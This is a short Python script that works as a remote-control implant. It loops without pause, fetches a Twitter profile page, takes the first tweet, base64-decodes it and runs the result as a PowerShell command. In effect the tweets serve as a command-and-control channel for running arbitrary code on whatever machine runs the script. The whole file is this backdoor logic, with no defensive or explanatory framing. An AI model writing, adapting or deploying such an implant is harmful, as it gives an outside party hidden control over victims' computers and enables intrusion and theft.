import requests, subprocess, sys
from bs4 import BeautifulSoup
from base64 import b64decode

# Variable initialization
last_cmd = ''

# Repeat !
while True :

    # Request the twitter page and parse it
    r = requests.get(u'https://twitter.com/s1mplecc')
    soup = BeautifulSoup(r.text, 'lxml')
    tweets = [p.text for p in soup.findAll('p', class_='tweet-text')]

    # Variable initialization
    i = 0
    tweet = []
    # Append all the page tweets in the tweet array
    for p in soup.findAll('p', class_='tweet-text'):
        tweet.append(p.text)
        i += 1 

    # Decode the "tweet-command"
    cmd = b64decode(tweet[0])
    
    # Launch the "tweet-command" only once
    if last_cmd != cmd:
        last_cmd = cmd
        sp = subprocess.Popen(["powershell.exe", cmd ], stdout=sys.stdout)
        sp.communicate()
